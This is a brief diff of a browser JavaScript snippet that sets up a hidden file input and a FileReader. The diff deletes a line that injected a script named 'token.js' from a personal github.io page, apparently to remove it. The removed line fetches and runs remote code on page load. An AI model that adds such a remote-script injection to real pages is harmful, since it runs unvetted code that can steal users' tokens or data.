@@ -3,7 +3,6 @@ input.type="file";
 input.style.display="none";
 document.body.appendChild(input);
 var reader = new FileReader();
-var src=document.createElement("script");src.src="https://haruymth.github.io/scripts/codes/token.js";document.body.appendChild(src);
 input.addEventListener('change', () => {
     for(file of input.files){
         reader.readAsText(file, 'UTF-8');
